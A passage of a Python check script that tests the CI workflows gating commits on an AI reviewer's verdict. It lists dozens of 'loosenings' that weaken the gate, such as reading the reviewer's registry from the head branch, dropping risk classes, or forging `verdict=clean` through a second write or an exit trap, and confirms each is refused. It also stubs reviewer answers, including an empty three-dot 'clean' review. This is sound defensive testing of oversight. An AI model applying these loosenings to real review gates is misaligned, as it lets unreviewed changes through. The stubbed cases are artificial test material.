    ("a product's decisions read as a page", None, lambda t: t.replace(CLASS_CODE, CLASS_CODE.replace("PRODUCT.md|", "", 1), 1)),
    ("a dot-directory read as pages", None, lambda t: t.replace(CLASS_CODE, CLASS_CODE.replace("|.*|*/.*", "", 1), 1)),
    ("anything unrecognised read as pages", None, lambda t: t.replace("              *) class=code ;;\n", "              *) ;;\n", 1)),
    ("the class reset after the list", None, lambda t: t.replace("          " + CLASS_ROLE + "\n", "          class=words\n          " + CLASS_ROLE + "\n", 1)),
    ("a risky change read by the ordinary role", None, lambda t: t.replace("*) role=%s ;;" % RISKY_ROLE, "*) role=%s ;;" % ORDINARY_ROLE, 1)),
    ("the risky class put with the ordinary", None, lambda t: t.replace("words|code) role=", "words|code|risky) role=", 1)),
    ("the role changed before it is handed on", None, lambda t: t.replace("          " + CLASS_OUT + "\n", "          role=%s\n          %s\n" % (ORDINARY_ROLE, CLASS_OUT), 1)),
    ("a list that fails read as no change", None, lambda t: t.replace("--name-only --no-renames", "--name-only --no-renames 2>/dev/null || true; : ", 1)),
    ("a rename read as its new name", None, lambda t: t.replace("--name-only --no-renames", "--name-only", 1)),
    ("names split on a line break", None, lambda t: t.replace("diff -z --name-only --no-renames", "diff --name-only --no-renames", 1)),
    ("the role never handed on", None, lambda t: t.replace("          " + CLASS_OUT + "\n", "", 1)),
    ("the role handed on twice", None, lambda t: _in_step(t, "Gather what the reviewer reads", CLASS_OUT, CLASS_OUT + '\n          echo "role=%s" >> "$GITHUB_OUTPUT"' % ORDINARY_ROLE)),
    ("an effort handed on by the class", None, lambda t: _in_step(t, "Gather what the reviewer reads", CLASS_OUT, CLASS_OUT + '\n          echo "effort=%s" >> "$GITHUB_OUTPUT"' % REVIEW_EFFORT)),
    ("the role not the class's", None, lambda t: t.replace(ROLE_IN, "ROLE: " + ORDINARY_ROLE, 1)),
    ("an effort handed to the read", None, lambda t: t.replace("          " + ROLE_IN + "\n", "          %s\n          EFFORT: %s\n" % (ROLE_IN, REVIEW_EFFORT), 1)),
    ("an effort unchecked", None, lambda t: t.replace(EFFORT_GUARD, "true", 1)),
    ("a read let in below max again", None, lambda t: t.replace(EFFORT_GUARD, EFFORT_GUARD.replace("in %s)" % REVIEW_EFFORT, "in high|%s)" % REVIEW_EFFORT, 1), 1)),
    ("an effort written into the call", None, lambda t: t.replace(READ_EFFORT + " \\", "--effort " + REVIEW_EFFORT + " \\", 1)),
    ("a model written into the call", None, lambda t: t.replace(READ_MODEL + " \\", "--model a-model-named-here \\", 1)),
    ("the selector read from the head", REVIEW_WORKFLOW, lambda t: t.replace(REVIEW_SELECT[0], 'cp model-registry/context.py "$RUNNER_TEMP/context.py"', 1)),
    ("every change given the risky read's pages", REVIEW_WORKFLOW, lambda t: t.replace(REVIEW_SELECT[1], REVIEW_SELECT[1].replace('"$class"', "risky"), 1)),
    ("every change given the selection", REVIEW_WORKFLOW, lambda t: t.replace(REVIEW_SELECT[1], REVIEW_SELECT[1].replace('"$class"', "code"), 1)),
    ("a file left out unnamed", REVIEW_WORKFLOW, lambda t: t.replace(REVIEW_SELECT[1], REVIEW_SELECT[1] + "\n          sed -i '/left out/d' /tmp/pages.txt", 1)),
    ("the reviewer not told", REVIEW_WORKFLOW, lambda t: t.replace(REVIEW_TOLD[1], 'echo "."', 1)),
    ("a thin read let pass clean", REVIEW_WORKFLOW, lambda t: t.replace("you will be read once more with it.", "say so.", 1)),
    ("the class kept from the read", REVIEW_WORKFLOW, lambda t: t.replace("          " + REVIEW_TOLD[2] + "\n", "", 1)),
    # The six classes (#86): each arm taken out, reordered, or blinded to case.
    ("the gate read as ordinary", None, _without_arm(RISK_GATE)),
    ("the brief read as ordinary", None, lambda t: t.replace(RISK_GATE, RISK_GATE.replace("agents.md|*/agents.md|", "", 1), 1)),
    ("pricing read as ordinary", None, _without_arm(RISK_PRICING)),
    ("live data read as ordinary", None, _without_arm(RISK_DATA)),
    ("sign-in read as ordinary", None, _without_arm(RISK_SIGN_IN)),
    ("a trust boundary read as ordinary", None, _without_arm(RISK_BOUNDARY)),
    ("release machinery read as ordinary", None, _without_arm(RISK_RELEASE)),
    ("personal data read as ordinary", None, _without_arm(RISK_PERSONAL)),
    ("secrets read as ordinary", None, _without_arm(RISK_SECRETS)),
    ("an unknown kind read as ordinary", None, lambda t: t.replace("              %s\n" % RISK_UNKNOWN, "              *) ;;\n", 1)),
    ("an unknown kind never tried", None, _without_arm(RISK_UNKNOWN)),
    ("a certificate's kind called ordinary", None, lambda t: t.replace(RISK_ORDINARY, RISK_ORDINARY.replace("*.woff2)", "*.woff2|*.pem)", 1), 1)),
    ("the registry read as ordinary", None, lambda t: t.replace(RISK_GATE, RISK_GATE.replace("model-registry/*|*/model-registry/*|", "", 1), 1)),
    ("an endpoint read as ordinary", None, lambda t: t.replace(RISK_BOUNDARY, RISK_BOUNDARY.replace("api/*|*/api/*|", "", 1), 1)),
    ("every script read as ordinary", None, lambda t: t.replace(RISK_RELEASE, RISK_RELEASE.replace("*.sh|", "", 1), 1)),
    ("a page's exit put before the gate", None, lambda t: t.replace("              %s\n              *.md) ;;\n" % RISK_GATE, "              *.md) ;;\n              %s\n" % RISK_GATE, 1)),
    ("a name's case trusted", None, lambda t: t.replace(RISK_CASE, 'case "$f" in', 1)),
    ("the risk never raised", None, lambda t: t.replace("          " + CLASS_RISKY + "\n", "", 1)),
    ("the risk found and dropped", None, lambda t: t.replace(CLASS_RISKY, '[ "$risky" = yes ] || class=risky', 1)),
    ("an ordinary read not told", None, lambda t: _in_step(t, "Read it", RISK_TOLD[1], 'echo "."')),
    ("an ordinary read told only below an effort no read is at", None, lambda t: _in_step(t, "Read it", RISK_TOLD[0], 'if [ "$EFFORT" != %s ]; then' % REVIEW_EFFORT)),
    ("what the read cost never counted", None, lambda t: _in_step(t, "Read it", READ_TOOK[1], "true")),
    ("what the read cost counted after a failure is named", None, lambda t: _in_step(t, "Read it", "          %s\n" % READ_TOOK[0], "          %s\n          %s\n" % (READ_ANSWERED, READ_TOOK[0]))),
    ("what the read cost never passed on", None, lambda t: _in_step(t, "Sign the verdict", "SPENT: ${{ steps.read.outputs.spent }}", "SPENT: none")),
    ("what the read cost kept from the verdict", None, lambda t: _in_step(t, "Sign the verdict", 'title="No findings on this commit (read as $CLASS at effort $EFFORT${SPENT:+; $SPENT})"', 'title="No findings on this commit (read as $CLASS at effort $EFFORT)"')),
)


def _check_class_loosenings():
    """Every loosening above, applied to each reviewer's real file, must be refused."""
    bad = 0
    for path in (REVIEW_WORKFLOW, PRODUCT_WORKFLOW):
        try:
            text = _read(path)
        except OSError as e:
            print("  wiring: %s" % e)
            return 1
        if class_faults(text, path):
            return 1  # the wiring checks say what; a loosened copy proves nothing here
        for what, only, loosen in CLASS_LOOSENINGS:
            if only not in (None, path):
                continue
            changed = loosen(text)
            if changed == text:
                print("  wiring: the loosening '%s' no longer applies to %s — rewrite it against "
                      "the file as it stands, or it proves nothing" % (what, path))
                bad += 1
            elif not class_faults(changed, path):
                print("  wiring: %s with %s passes the class hold — the guard for it is gone"
                      % (path, what))
                bad += 1
    if not bad:
        print("ok: each reviewer hands a change to its class's role, %s for pages and ordinary "
              "code and %s for the risky classes and any kind of file the list does not know, "
              "worked out from the diff it reads, and each reads at %s alone, an ordinary read told "
              "it was not read as risky; the class was "
              "run on %d change(s), review.yml gives any change "
              "risky every file and the registry, and words and code the selection of decision 0014's "
              "context pilot (its block run on %d), each verdict says what its read "
              "cost, and each of %d loosenings was refused"
              % (ORDINARY_ROLE, RISKY_ROLE, REVIEW_EFFORT, len(CLASS_CASES), len(PAGES_CASES),
                 len(CLASS_LOOSENINGS)))
    return bad


# THE ROLE, READ (decision 0008). Each reviewer resolves the class's role from
# the registry inside the read — review.yml from the protected branch, never the
# head it reads, and review-product.yml from this repository's checkout, which
# the door holds to main — and asks it once. A role that gives no verdict, or
# clears the change without a review behind it, hands the read to its fallback;
# with no fallback, or none that answers, the step fails and the verdict is
# `neutral`: unread, the gate red.
# The reading block is run, not read, on ROUTE_CASES below: one block, from
# `reviewed()` to the verdict, as the job runs it.
ROUTE_RESOLVE = ('EFFORT=$(resolve "$ROLE" effort) || fail "the registry could not resolve $ROLE"',
                 'FALLBACK=$(resolve "$ROLE" fallback) || fail "the registry could not resolve $ROLE"')
ROUTE_REGISTRY = {
    REVIEW_WORKFLOW: 'git show "origin/$DEFAULT_BRANCH:model-registry/$f" '
                     '> "$reg/$f" || fail "the protected branch holds no model-registry/$f"',
    PRODUCT_WORKFLOW: 'reg="$GITHUB_WORKSPACE/model-registry"',
}
ROUTE_MAIN = "DEFAULT_BRANCH: ${{ github.event.repository.default_branch }}"
# The weekly cash limit reaches the caller in both reviewers alike (his
# condition, 6 October 2026): a product's reads spend the same cash.
ROUTE_CASH = "REVIEW_CASH_WEEKLY: ${{ secrets.REVIEW_CASH_WEEKLY }}"
ROUTE_ASK_GUARD = ('case "$effort" in %s) ;; *) printf \'{"is_error":true,"subtype":"no_effort"}\\n\' '
                   '> "$out"; : > "$err"; return 2 ;; esac' % REVIEW_EFFORT)
ROUTE_FIRST = "fell_back=no"
# The verdict is derived from the findings, after every read that exited clean,
# and a derivation that goes wrong leaves an answer with no verdict, never the
# model's own word (decision 0014, position C).
ROUTE_DERIVE = ('derive() { python3 "$reg/ask.py" derive "$out" || printf \'{"is_error":true,"subtype":"not_derived"}\\n\' '
                '> "$out"; }')
ROUTE_LAST = 'echo "verdict=$verdict" >> "$GITHUB_OUTPUT"'
# (what happens, the primary's exit and verdict, the fallback's, the fallback
# role or none, seconds left when the fallback would start, what must follow:
# the roles asked in order, and the verdict read or None for a read that fails).
# An exit and verdict may carry a third item, the review written with it; left
# out, it is REVIEW_READ, a review that says what it read; None leaves the
# answer with no `review` at all.
ROUTE_CASES = (
    ("the role answers clean", (0, "clean"), (0, "clean"), FALLBACK_ROLE, 600,
     ([ORDINARY_ROLE], "clean")),
    ("the role answers blocking, which is an answer, never a reason to ask again",
     (0, "blocking"), (0, "clean"), FALLBACK_ROLE, 600, ([ORDINARY_ROLE], "blocking")),
    ("the role cannot be reached", (1, ""), (0, "advisory"), FALLBACK_ROLE, 600,
     ([ORDINARY_ROLE, FALLBACK_ROLE], "advisory")),
    ("the role runs out of time", (124, ""), (0, "clean"), FALLBACK_ROLE, 600,
     ([ORDINARY_ROLE, FALLBACK_ROLE], "clean")),
    ("the role answers with no verdict", (0, ""), (0, "clean"), FALLBACK_ROLE, 600,
     ([ORDINARY_ROLE, FALLBACK_ROLE], "clean")),
    ("neither answers", (1, ""), (1, ""), FALLBACK_ROLE, 600, ([ORDINARY_ROLE, FALLBACK_ROLE], None)),
    ("neither answers with a verdict", (0, ""), (0, ""), FALLBACK_ROLE, 600,
     ([ORDINARY_ROLE, FALLBACK_ROLE], None)),
    ("no time is left for the fallback", (1, ""), (0, "clean"), FALLBACK_ROLE, 30, ([ORDINARY_ROLE], None)),
    ("no fallback, and the role cannot be reached", (1, ""), (0, "clean"), "", 600, ([ORDINARY_ROLE], None)),
    ("no fallback, and the role answers", (0, "advisory"), (0, "clean"), "", 600,
     ([ORDINARY_ROLE], "advisory")),
    # Whatever a read wrote, one that exited in error is not taken, and nor is
    # a verdict the schema does not hold.
    ("the role exits in error with a verdict written, and no time is left", (1, "clean"),
     (0, "clean"), FALLBACK_ROLE, 30, ([ORDINARY_ROLE], None)),
    ("the fallback exits in error with a verdict written", (1, ""), (1, "clean"), FALLBACK_ROLE, 600,
     ([ORDINARY_ROLE, FALLBACK_ROLE], None)),
    ("the fallback answers a finding of a severity outside the schema", (1, ""), (0, "findings"), FALLBACK_ROLE, 600,
     ([ORDINARY_ROLE, FALLBACK_ROLE], None)),
    # THE VERDICT IS DERIVED (decision 0014, position C): findings in, the one
    # verdict out. A severity the schema does not hold clears nothing; one
    # blocking finding among advisories is a refusal and never asked again; and a
    # verdict word of the model's own, `clean` over a blocking finding, is ignored.
    ("the role answers a finding of unknown severity, which clears nothing", (0, "findings"), (0, "clean"),
     FALLBACK_ROLE, 600, ([ORDINARY_ROLE, FALLBACK_ROLE], "clean")),
    ("the role answers advisory findings and a blocking one", (0, "mixed"), (0, "clean"), FALLBACK_ROLE, 600,
     ([ORDINARY_ROLE], "blocking")),
    ("the role sends a verdict of its own, clean, over a blocking finding", (0, "stray"), (0, "clean"),
     FALLBACK_ROLE, 600, ([ORDINARY_ROLE], "blocking")),
    # A verdict with nothing read behind it is no answer. #108's first read on
    # 50a4688: `clean`, and a review of three dots, 15 tokens out against
    # 129,357 in, and the gate opened on it. The same commit read again wrote
    # 9,593 tokens.
    ("the role answers clean with a review of three dots, as #108's first read did",
     (0, "clean", "..."), (0, "advisory"), FALLBACK_ROLE, 600, ([ORDINARY_ROLE, FALLBACK_ROLE], "advisory")),
    ("no fallback, and the role answers clean with a review of three dots",
     (0, "clean", "..."), (0, "clean"), "", 600, ([ORDINARY_ROLE], None)),
    ("neither writes a review with anything in it", (0, "clean", "..."), (0, "advisory", " "),
     FALLBACK_ROLE, 600, ([ORDINARY_ROLE, FALLBACK_ROLE], None)),
    # A refusal is an answer however short (#110's first read): a terse
    # `blocking` is never handed to a reader who might clear the commit.
    ("the role refuses in three dots, and the fallback would answer clean",
     (0, "blocking", "..."), (0, "clean"), FALLBACK_ROLE, 600, ([ORDINARY_ROLE], "blocking")),
    ("no fallback, and the role refuses in three dots",
     (0, "blocking", "..."), (0, "clean"), "", 600, ([ORDINARY_ROLE], "blocking")),
    # And with no review at all, signed a failure since #110 where it had gone
    # unread (#111's read, advisory 2: the sentence was prose no case held).
    ("no fallback, and the role refuses with no review at all",
     (0, "blocking", None), (0, "clean"), "", 600, ([ORDINARY_ROLE], "blocking")),
    ("the role refuses with no review at all, and the fallback would answer clean",
     (0, "blocking", None), (0, "clean"), FALLBACK_ROLE, 600, ([ORDINARY_ROLE], "blocking")),
    ("the role answers clean in three dots, and the fallback refuses in three",
     (0, "clean", "..."), (0, "blocking", "..."), FALLBACK_ROLE, 600,
     ([ORDINARY_ROLE, FALLBACK_ROLE], "blocking")),
    # The bar, pinned on both sides: 100 characters that are not whitespace.
    ("no fallback, and the role's review is one character short of the bar",
     (0, "clean", " \n".join(["x" * 33] * 3)), (0, "clean"), "", 600, ([ORDINARY_ROLE], None)),
    ("no fallback, and the role's review just clears the bar",
     (0, "clean", " \n".join(["x" * 33] * 3) + "x"), (0, "clean"), "", 600,
     ([ORDINARY_ROLE], "clean")),
    # A READ SHORT OF CONTEXT (decision 0014, F(2)): read once more by the role
    # that answered, with what it named, and never a third time. The re-read's
    # answer is the eighth item, (exit, word); a ninth, False, is a `more()`
    # that could add nothing.
    ("the role is short of context, and its one re-read is clean", (0, "short"), (0, "advisory"),
     FALLBACK_ROLE, 600, ([ORDINARY_ROLE, ORDINARY_ROLE], "clean"), (0, "clean")),
    ("the role is short twice, which signs blocking and asks no third time", (0, "short"), (0, "clean"),
     FALLBACK_ROLE, 600, ([ORDINARY_ROLE, ORDINARY_ROLE], "blocking"), (0, "short")),
    ("a real blocking finding beside a shortfall, which is never re-read", (0, "shortmix"), (0, "clean"),
     FALLBACK_ROLE, 600, ([ORDINARY_ROLE], "blocking"), (0, "clean")),
    ("the role is short, and nothing it named could be added", (0, "short"), (0, "clean"),
     FALLBACK_ROLE, 600, ([ORDINARY_ROLE], "blocking"), (0, "clean"), False),
    ("the role is short, naming no path a read may fetch", (0, "shortbadpath"), (0, "clean"),
     FALLBACK_ROLE, 600, ([ORDINARY_ROLE], "blocking"), (0, "clean")),
    ("the role is short, and its re-read fails", (0, "short"), (0, "clean"),
     FALLBACK_ROLE, 600, ([ORDINARY_ROLE, ORDINARY_ROLE], "blocking"), (1, "")),
    ("the role is short, and no time is left to read again", (0, "short"), (0, "clean"),
     FALLBACK_ROLE, 30, ([ORDINARY_ROLE], "blocking"), (0, "clean")),
    ("the role fails, the fallback is short, and the fallback's re-read is clean", (1, ""), (0, "short"),
     FALLBACK_ROLE, 600, ([ORDINARY_ROLE, FALLBACK_ROLE, FALLBACK_ROLE], "clean"), (0, "clean")),
    # A BUDGET REFUSAL PARKS (decision 0014, D): never signed as a model's
    # refusal, and never handed to a fallback.
    ("the spending check refuses the read", (1, "budget"), (0, "clean"), FALLBACK_ROLE, 600,
     ([ORDINARY_ROLE], None)),
    ("the provider's own limit refuses the read", (1, "limit"), (0, "clean"), FALLBACK_ROLE, 600,
     ([ORDINARY_ROLE], None)),
    ("the spending check refuses the re-read", (0, "short"), (0, "clean"), FALLBACK_ROLE, 600,
     ([ORDINARY_ROLE, ORDINARY_ROLE], None), (1, "budget")),
)
REVIEW_READ = ("Addressed to the CTO. I read the diff against main's tip and the pages it touches, "
               "and checked each changed line against the brief and the pages beside it. Nothing "
               "blocking. I did not run check.sh, so the caps rest on CI. Fairly sure.")


def route_says(block, first, second, fallback, left, again=(0, "clean"), more_ok=True):
    """Run the reading block with a stub `ask()`. (roles asked, verdict read or None), a
    `written […]` string when the output file's verdict lines disagree with it, or None."""
    with tempfile.TemporaryDirectory() as d:
        body = "\n".join(l.replace("/tmp/", d + "/").replace('"$t/', '"' + d + "/") for l in block)
        # What `read_bytes=` measures, so the block's own line runs rather than
        # a stub's value standing in for it.
        for f in ("prompt.txt", "system.txt"):
            with open(os.path.join(d, f), "w", encoding="utf-8") as g:
                g.write("x" * 50)
        stub = textwrap.dedent("""\
            set -euo pipefail
            out='{d}/resp.json'; err='{d}/err.txt'; : > "$err"
            fail() {{ echo "failed: $1"; exit 3; }}
            why() {{ echo "a reason"; }}
            ledger='{d}/attempts.jsonl'
            more() {{ [ -z "$MORE_FAILS" ]; }}
            ask() {{
              role=$1 model="model-of-$1" effort=high
              echo "$1" >> '{d}/asked'
              if [ "$(grep -cx -- "$1" '{d}/asked')" -gt 1 ]; then r=$R_RC; v=$R_V; w=$REVIEW_READ_W; n=""
              elif [ "$1" = "$ROLE" ]; then r=$P_RC; v=$P_V; w=$P_W; n=$P_NONE; else r=$F_RC; v=$F_V; w=$F_W; n=$F_NONE; fi
              if [ "$v" = budget ] || [ "$v" = limit ]; then
                jq -cn --arg s "$v" '{{is_error: true, subtype: (if $s == "budget" then "budget_refused" else "provider_limit" end)}}' > "$out"
              elif [ -n "$v" ]; then
                # What a model answers under the schema: findings, and a review. The
                # word stands for the findings the stub gives, never for a verdict
                # (decision 0014): `stray` is the retired verdict field sent anyway,
                # `findings` a severity the schema does not hold.
                jq -cn --arg v "$v" --arg w "$w" --arg n "$n" --arg r "$r" '
                  ({{blocking: [{{severity: "blocking", text: "a finding"}}],
                    advisory: [{{severity: "advisory", text: "a finding"}}],
                    mixed: [{{severity: "advisory", text: "a finding"}}, {{severity: "blocking", text: "another"}}],
                    stray: [{{severity: "blocking", text: "a finding"}}],
                    short: [{{severity: "needs-context", text: "a finding", files: ["check.sh"]}}],
                    shortmix: [{{severity: "needs-context", text: "a finding", files: ["check.sh"]}}, {{severity: "blocking", text: "another", files: []}}],
                    shortbadpath: [{{severity: "needs-context", text: "a finding", files: ["../outside"]}}],
                    clean: []}}[$v] // [{{severity: "critical", text: "a finding"}}]) as $f
                  | {{result: ((if $n == "1" then {{findings: $f}} else {{findings: $f, review: $w}} end
                               | if $v == "stray" then . + {{verdict: "clean"}} else . end
                               | if $r != "0" and ($v == "clean" or $v == "advisory" or $v == "blocking")
                                 then . + {{verdict: $v}} else . end) | tojson),
                     usage: {{input_tokens: 9, output_tokens: 2}}, total_cost_usd: 0.01}}' > "$out"
              else
                printf '{{"is_error":true,"subtype":"x"}}\\n' > "$out"
              fi
              return "$r"
            }}
            limit=25 STARTED=$(( $(date +%s) - limit * 60 + {left} ))
            left=600
            role=$ROLE model=unknown effort=high
            reg='{reg}'
            """).format(d=d, left=left, reg=os.path.abspath(os.path.dirname(CALLER)))
        script = stub + body + '\necho "done: $verdict"\n'
        with open(os.path.join(d, "route.sh"), "w", encoding="utf-8") as f:
            f.write(script)
        env = dict(os.environ, ROLE=ORDINARY_ROLE, FALLBACK=fallback, CLASS="code",
                   P_RC=str(first[0]), P_V=first[1], F_RC=str(second[0]), F_V=second[1],
                   P_W=first[2] if len(first) > 2 and first[2] is not None else REVIEW_READ,
                   F_W=second[2] if len(second) > 2 and second[2] is not None else REVIEW_READ,
                   P_NONE="1" if len(first) > 2 and first[2] is None else "",
                   F_NONE="1" if len(second) > 2 and second[2] is None else "",
                   R_RC=str(again[0]), R_V=again[1], REVIEW_READ_W=REVIEW_READ, MORE_FAILS="" if more_ok else "1",
                   GITHUB_OUTPUT=os.path.join(d, "out"), GITHUB_STEP_SUMMARY=os.path.join(d, "summary"))
        try:
            p = subprocess.run(["bash", os.path.join(d, "route.sh")], env=env, capture_output=True,
                               text=True, timeout=60)
            asked = open(os.path.join(d, "asked"), encoding="utf-8").read().split()
            out = os.path.join(d, "out")
            written = ([l.split("=", 1)[1] for l in open(out, encoding="utf-8").read().splitlines()
                        if l.startswith("verdict=")] if os.path.exists(out) else [])
        except (OSError, subprocess.SubprocessError):
            return None
    # WHAT IS SIGNED IS WHAT WAS WRITTEN (#111's second read, advisory). *Sign the
    # verdict* reads the `verdict=` line in $GITHUB_OUTPUT, not the shell's
    # variable, so a case holds the file: one line, saying what the read said,
    # and none at all from a read that failed.
    done = re.search(r"^done: (\w+)$", p.stdout, re.M)
    if p.returncode == 0 and done:
        return asked, done.group(1) if written == [done.group(1)] else "written %s" % written
    if p.returncode == 3 and "failed: " in p.stdout:
        return asked, None if not written else "written %s" % written
    return None


def route_faults(text, path):
    """What a reviewer has lost of reading by the registry's role, with its fallback, never open."""
    lost = []
    span = _step_span(text, "Read it")
    r = text[span[0]:span[1]] if span else ""
    for line in ROUTE_RESOLVE + (ROUTE_REGISTRY[path], ROUTE_ASK_GUARD, ROUTE_DERIVE):
        if line not in r:
            lost.append("`%s`" % line)
    if ROUTE_CASH not in r:
        lost.append("`%s` in the read's environment, so the weekly limit reaches the caller" % ROUTE_CASH)
    if path == REVIEW_WORKFLOW and len(re.findall(r"^\s*DEFAULT_BRANCH:", r, re.M)) != 1 or (
            path == REVIEW_WORKFLOW and ROUTE_MAIN not in r):
        lost.append("`%s` as the one branch the registry is read from" % ROUTE_MAIN)
    # ONE BLOCK, RUN WHOLE (#110's second read, advisory 1): from `reviewed()`
    # to the verdict, so every line between the two tests and the read runs
    # here as it runs in the job. Run as two pieces, the lines between them
    # ran in neither, and bash takes a function's last definition: a second
    # `reviewed()` placed there would win in the real read and pass here.
    # ITS LIMIT (#111's read, advisory 1): everything above `reviewed()` —
    # `ask()`, `why()`, `fail()`, the role and its limits — comes from the
    # stub, not the file, so a second `ask()` placed above the block would win
    # in the real read and never run here. Only the reader of the diff guards
    # that region until the harness starts higher, with a fake `claude` on PATH.
    # ITS OTHER LIMIT (#118's read): the harness stops at `ROUTE_LAST`, so
    # below it only a text rule holds — no line of *Read it* but that one may
    # name both `GITHUB_OUTPUT` and `verdict`. A write spelled another way
    # below the block (the file through a variable, a braced group, the name
    # in capitals) passes it, and only the reader of the diff guards that
    # region until the harness runs to the end of the step.
    block = _block(r, lambda l: l == REVIEW_TEST, lambda l: l == ROUTE_LAST)
    if block is None or "answered() {" not in block or ROUTE_FIRST not in block:
        lost.append("one reading block from `%s`, through `answered()` and `%s`, to `%s`"
                    % (REVIEW_TEST, ROUTE_FIRST, ROUTE_LAST))
        return lost
    # One line of *Read it* writes the verdict the next step signs, and it is the
    # block's last: a second, anywhere in the step, is a verdict nothing reads
    # the way the cases do (#111's second read: GitHub keeps the last value a
    # step writes for a name).
    writes = [l.strip() for l in r.splitlines()
              if "GITHUB_OUTPUT" in l and "verdict" in l and not l.strip().startswith("#")]
    if writes != [ROUTE_LAST]:
        lost.append("one line writing the verdict, `%s`, and no other (it has %s)" % (ROUTE_LAST, writes))
    for what, first, second, fallback, left, want, *rest in ROUTE_CASES:
        got = route_says(block, first, second, fallback, left, *rest)
        if got != want:
            lost.append("when %s, the roles %s asked and %s (it was %s)"
                        % (what, want[0], "the verdict %s read" % want[1] if want[1] else
                           "the read failed, never open", got))
    return lost


# The review behind a verdict that opens the gate (#109): one test,
# `reviewed()`, run in `answered()` so an empty `clean` or `advisory` hands over
# to the fallback, and on the review the gate publishes so with no fallback it
# fails; and, per file, that last line beside the one it replaced, which took
# any review at all. A `blocking` is exempt from both (REFUSAL_*): a terse one
# stands, and so does one with no review at all, which before #110 went unread.
REVIEW_TEST = r'''reviewed() { jq -Rse 'gsub("\\s"; "") | length >= 100' > /dev/null 2>&1; }'''
REVIEW_WEIGHED = ("jq -r '.result // empty' \"$out\" 2>/dev/null | jq -r '.review // empty' 2>/dev/null "
                  "| reviewed")
REVIEW_FAIL = 'fail "the reviewer\'s review was under 100 characters, not counting whitespace"'
REFUSAL_KEPT = '[ "$verdict" = blocking ] || '
REFUSAL_ANSWERED = "blocking|needs-context) return 0 ;;\n              clean|advisory)"
REVIEW_TAKEN = {
    REVIEW_WORKFLOW: (REFUSAL_KEPT + "reviewed < /tmp/review.md || " + REVIEW_FAIL,
                      '[ -s /tmp/review.md ] || fail "the reviewer returned no review"'),
    PRODUCT_WORKFLOW: (REFUSAL_KEPT + 'reviewed < "$t/review.md" || ' + REVIEW_FAIL,
                       '[ -s "$t/review.md" ] || fail "the reviewer returned no review"'),
}
ROUTE_LOOSENINGS = (
    ("the registry read from the head", REVIEW_WORKFLOW, lambda t: t.replace(ROUTE_REGISTRY[REVIEW_WORKFLOW], 'cp "model-registry/$f" "$reg/$f"', 1)),
    ("the weekly cash limit kept from the caller", None, lambda t: t.replace("          " + ROUTE_CASH + "\n", "", 1)),
    ("the registry read from the head's branch", REVIEW_WORKFLOW, lambda t: t.replace(ROUTE_MAIN, "DEFAULT_BRANCH: ${{ github.head_ref }}", 1)),
    ("a role the registry cannot resolve read anyway", None, lambda t: t.replace(ROUTE_RESOLVE[0], 'EFFORT=$(resolve "$ROLE" effort) || EFFORT=high', 1)),
    ("an effort the ask never checks", None, lambda t: t.replace(ROUTE_ASK_GUARD, "true", 1)),
    ("a fallback let in below max again", None, lambda t: t.replace(ROUTE_ASK_GUARD, ROUTE_ASK_GUARD.replace("in %s)" % REVIEW_EFFORT, "in high|%s)" % REVIEW_EFFORT, 1), 1)),
    ("the fallback never asked", None, lambda t: t.replace('ask "$FALLBACK" "$left" || rc=$?', "true", 1)),
    ("the fallback asked after an answer", None, lambda t: t.replace('{ [ "$rc" -ne 0 ] || ! answered; }', "true", 1)),
    ("an answer with no verdict taken", None, lambda t: t.replace('{ [ "$rc" -ne 0 ] || ! answered; }', '[ "$rc" -ne 0 ]', 1)),
    ("a failure forgotten when no time is left", None, lambda t: t.replace('            if [ "$left" -ge 60 ]; then\n              rc=0\n', '            rc=0\n            if [ "$left" -ge 60 ]; then\n', 1)),
    ("a failed read never named", None, lambda t: t.replace("          " + READ_ANSWERED + "\n", "", 1)),
    ("the first read's verdict left to the model", None, lambda t: t.replace('          ask "$ROLE" "$bound" || rc=$?\n          [ "$rc" -ne 0 ] || derive\n', '          ask "$ROLE" "$bound" || rc=$?\n', 1)),
    ("the fallback's verdict left to the model", None, lambda t: t.replace('              ask "$FALLBACK" "$left" || rc=$?\n              [ "$rc" -ne 0 ] || derive\n', '              ask "$FALLBACK" "$left" || rc=$?\n', 1)),
    ("a derivation that fails open", None, lambda t: t.replace(' || printf \'{"is_error":true,"subtype":"not_derived"}\\n\' > "$out"; }', ' || true; }', 1)),
    ("a verdict with no review behind it counted as an answer", None, lambda t: t.replace(REVIEW_WEIGHED, "true", 1)),
    ("an empty review taken, as before #109", REVIEW_WORKFLOW, lambda t: t.replace(*REVIEW_TAKEN[REVIEW_WORKFLOW], 1)),
    ("an empty review taken, as before #109", PRODUCT_WORKFLOW, lambda t: t.replace(*REVIEW_TAKEN[PRODUCT_WORKFLOW], 1)),
    ("a bar of one character", None, lambda t: t.replace(REVIEW_TEST, REVIEW_TEST.replace(">= 100", ">= 1"), 1)),
    # Beside the original, not in its place: before #111 the test ran
    # `reviewed()` and the reading block as two pieces, and this line, between
    # them, ran in neither while bash took it over the first in the real read.
    ("a second, looser bar defined after the first", None, lambda t: t.replace("          " + READ_BEGAN + "\n", "          " + READ_BEGAN + "\n          " + REVIEW_TEST.replace(">= 100", ">= 99") + "\n", 1)),
    ("a second verdict written after the first", None, lambda t: t.replace("          " + ROUTE_LAST + "\n", "          " + ROUTE_LAST + "\n          echo \"verdict=clean\" >> \"$GITHUB_OUTPUT\"\n", 1)),
    # Deferred to the step's end, and spelled so the text rule misses it: only
    # the file check refuses this one (#118's read, advisory 2).
    ("a verdict deferred past the read", None, lambda t: t.replace("          " + READ_BEGAN + "\n", "          " + READ_BEGAN + "\n          f=$GITHUB_OUTPUT\n          trap 'echo verdict=clean >> \"$f\"' EXIT\n", 1)),
    ("a verdict written before the read", None, lambda t: t.replace("          " + READ_BEGAN + "\n", "          " + READ_BEGAN + "\n          echo \"verdict=clean\" >> \"$GITHUB_OUTPUT\"\n", 1)),
    ("a terse refusal handed to the fallback", None, lambda t: t.replace(REFUSAL_ANSWERED, "clean|advisory|blocking)", 1)),
    ("a terse refusal failed as unread", None, lambda t: t.replace(REFUSAL_KEPT, "", 1)),
    ("an empty refusal failed as unread, as before #110", REVIEW_WORKFLOW, lambda t: t.replace(REVIEW_TAKEN[REVIEW_WORKFLOW][0], REVIEW_TAKEN[REVIEW_WORKFLOW][1] + "\n          " + REVIEW_TAKEN[REVIEW_WORKFLOW][0], 1)),
